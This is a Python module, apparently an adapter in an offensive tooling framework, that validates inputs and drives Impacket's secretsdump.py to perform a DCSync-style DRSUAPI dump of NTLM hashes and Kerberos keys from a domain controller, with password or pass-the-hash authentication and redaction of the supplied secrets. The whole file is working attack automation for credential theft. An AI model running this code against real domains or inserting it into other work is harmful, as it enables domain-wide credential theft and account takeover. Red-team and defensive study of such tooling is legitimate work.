"""
Subprocess execution for secretsdump: drives the real Impacket
`secretsdump.py -just-dc` CLI for a targeted DRSUAPI (DCSync-style)
credential dump against a domain controller.

No parsing logic here -- see parse.py. Every input check happens before
any subprocess runs, and bad input or a genuine execution failure returns
a RawSecretsdumpResult with `error` set rather than raising.

Confirmed real flags against the installed `secretsdump.py -h` on CT 115
(Impacket v0.13.1):
  positional target  [[domain/]username[:password]@]<targetName or address>
                      -- unlike GetUserSPNs.py, this one DOES take the
                      full domain/username:password@target form.
  -just-dc            DRSUAPI replication only (NTLM hashes + Kerberos
                       keys), no SAM/LSA registry access needed -- this
                       is what makes it a targeted DCSync, not a full
                       local-admin-level dump. Always passed unless
                       -just-dc-user is given (which implies -just-dc
                       itself per its own -h text).
  -just-dc-user USERNAME   Extract only this one account's NTDS.DIT data.
  -hashes LMHASH:NTHASH / -no-pass  (pass-the-hash, pairs together)
  -dc-ip ip address   independent override of which DC to bind DRSUAPI
                       to; always safe to pass alongside the connection
                       target, unlike kerberoast's dc_ip (confirmed from
                       -h: "If omitted it use the domain part (FQDN)
                       specified in target parameter" -- a pure fallback
                       default, not a second value for the same slot).
"""
from __future__ import annotations

import ipaddress
import re
import shutil
import subprocess
from typing import List, Optional, Tuple

from tradecraft.adapters.secretsdump.parse import RawSecretsdumpResult, normalize_target_host

TIMEOUT_FULL_DUMP = 600
TIMEOUT_SINGLE_USER = 120
SECRETSDUMP_BIN = "secretsdump.py"

_IPV4_RANGE_REGEX = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}\s*-\s*\d")


def find_secretsdump_binary() -> Optional[str]:
    return shutil.which(SECRETSDUMP_BIN)


def _redact(text: str, secrets: List[str]) -> str:
    if not text:
        return text
    for secret in sorted({s for s in secrets if s}, key=len, reverse=True):
        text = text.replace(secret, "<redacted>")
    return text


def _is_ip_address(value: str) -> bool:
    try:
        ipaddress.ip_address(value)
        return True
    except ValueError:
        return False


def _validate_target(target: str) -> Optional[str]:
    clean = (target or "").strip()
    if not clean:
        return "target (domain controller host/IP) is required"
    if "," in clean or any(char.isspace() for char in clean):
        return "secretsdump runs against a single domain controller only; target lists are not accepted"
    if "/" in clean:
        return "secretsdump runs against a single domain controller only; CIDR ranges are not accepted"
    if _IPV4_RANGE_REGEX.match(clean):
        return "secretsdump runs against a single domain controller only; IP ranges are not accepted"
    return None


def _validate_domain(domain: str) -> Optional[str]:
    clean = (domain or "").strip()
    if not clean:
        return "domain is required for secretsdump"
    if any(char.isspace() for char in clean):
        return "domain must not contain whitespace"
    if any(char in clean for char in "/\\,@"):
        return "domain must be a bare domain name, e.g. 'corp.local'"
    return None


def _normalize_username(username: str, domain: str) -> Tuple[Optional[str], Optional[str]]:
    """Returns (bare_username, error) -- same shape as kerberoast's own
    _normalize_username (mirrored, not imported, per this codebase's
    per-adapter self-containment convention)."""
    user = (username or "").strip()
    if not user:
        return None, "username is required for secretsdump"

    if "\\" in user:
        supplied_domain, _, user = user.partition("\\")
        if supplied_domain and supplied_domain.casefold() != domain.casefold():
            return None, f"username domain '{supplied_domain}' does not match domain '{domain}'"
    elif "@" in user:
        user, _, supplied_domain = user.partition("@")
        if supplied_domain and supplied_domain.casefold() != domain.casefold():
            return None, f"username domain '{supplied_domain}' does not match domain '{domain}'"

    user = user.strip()
    if not user:
        return None, "username is required for secretsdump"
    return user, None


def _validate_credentials(username: str, password: str, hashes: str, domain: str) -> Optional[str]:
    if not (username or "").strip():
        return "username is required for secretsdump"
    if (password or "").strip() and (hashes or "").strip():
        return "provide at most one of password or hashes, not both"
    if not (password or "").strip() and not (hashes or "").strip():
        return "one of password or hashes is required for secretsdump"
    return _validate_domain(domain)


def _validate_dc_ip(dc_ip: str) -> Optional[str]:
    clean = (dc_ip or "").strip()
    if not clean:
        return None
    if not _is_ip_address(clean):
        return f"dc_ip '{dc_ip}' is not a single IP address"
    return None


def _validate_just_dc_user(just_dc_user: str) -> Optional[str]:
    clean = (just_dc_user or "").strip()
    if not clean:
        return None
    if clean.startswith("-"):
        return f"just_dc_user '{just_dc_user}' must be a bare username, not an option"
    if any(char.isspace() for char in clean) or "," in clean:
        return "just_dc_user must be a single bare username"
    return None


def build_argv(
    target: str,
    domain: str,
    username: str,
    password: str = "",
    hashes: str = "",
    dc_ip: str = "",
    just_dc_user: str = "",
    binary: str = SECRETSDUMP_BIN,
) -> List[str]:
    """Builds argv for one secretsdump.py DRSUAPI dump. Assumes inputs
    already passed validation (see execute())."""
    clean_target = target.strip()
    clean_domain = domain.strip()
    clean_password = (password or "").strip()
    clean_hashes = (hashes or "").strip()
    clean_just_dc_user = (just_dc_user or "").strip()

    principal = f"{clean_domain}/{username}"
    if clean_password:
        principal += f":{clean_password}"
    principal += f"@{clean_target}"

    argv = [binary]

    if clean_hashes:
        argv.extend(["-hashes", clean_hashes, "-no-pass"])

    if clean_just_dc_user:
        # -just-dc-user already implies -just-dc; passing both is harmless
        # per its own -h text, but kept singular for a cleaner argv.
        argv.extend(["-just-dc-user", clean_just_dc_user])
    else:
        argv.append("-just-dc")

    if dc_ip.strip():
        argv.extend(["-dc-ip", dc_ip.strip()])

    argv.append(principal)
    return argv


def execute(
    target: str,
    domain: str,
    username: str,
    password: str = "",
    hashes: str = "",
    dc_ip: str = "",
    just_dc_user: str = "",
    timeout: Optional[int] = None,
) -> RawSecretsdumpResult:
    """Executes one targeted DRSUAPI (DCSync-style) credential dump
    against the domain controller `target`."""
    clean_target = normalize_target_host(target)
    clean_domain = (domain or "").strip()

    target_error = _validate_target(clean_target)
    if target_error:
        return RawSecretsdumpResult(target=clean_target, domain=clean_domain, error=target_error)

    credential_error = _validate_credentials(username, password, hashes, clean_domain)
    if credential_error:
        return RawSecretsdumpResult(target=clean_target, domain=clean_domain, error=credential_error)

    clean_username, username_error = _normalize_username(username, clean_domain)
    if username_error:
        return RawSecretsdumpResult(target=clean_target, domain=clean_domain, error=username_error)

    dc_ip_error = _validate_dc_ip(dc_ip)
    if dc_ip_error:
        return RawSecretsdumpResult(target=clean_target, domain=clean_domain, error=dc_ip_error)

    just_dc_user_error = _validate_just_dc_user(just_dc_user)
    if just_dc_user_error:
        return RawSecretsdumpResult(target=clean_target, domain=clean_domain, error=just_dc_user_error)

    binary = find_secretsdump_binary()
    if binary is None:
        return RawSecretsdumpResult(
            target=clean_target, domain=clean_domain,
            error="secretsdump.py executable not found on PATH",
        )

    clean_just_dc_user = (just_dc_user or "").strip()
    if timeout is not None:
        effective_timeout = timeout
    else:
        effective_timeout = TIMEOUT_SINGLE_USER if clean_just_dc_user else TIMEOUT_FULL_DUMP

    argv = build_argv(
        target=clean_target,
        domain=clean_domain,
        username=clean_username,
        password=password,
        hashes=hashes,
        dc_ip=dc_ip,
        just_dc_user=just_dc_user,
        binary=binary,
    )

    try:
        proc = subprocess.run(
            argv,
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            timeout=effective_timeout,
        )
    except FileNotFoundError:
        return RawSecretsdumpResult(
            target=clean_target, domain=clean_domain,
            error="secretsdump.py executable not found on PATH",
        )
    except subprocess.TimeoutExpired:
        return RawSecretsdumpResult(
            target=clean_target, domain=clean_domain,
            error=f"secretsdump.py timed out after {effective_timeout}s",
        )

    secrets = [s for s in ((password or "").strip(), (hashes or "").strip()) if s]
    return RawSecretsdumpResult(
        target=clean_target,
        domain=clean_domain,
        stdout=_redact(proc.stdout or "", secrets),
        stderr=_redact(proc.stderr or "", secrets),
        returncode=proc.returncode,
    )
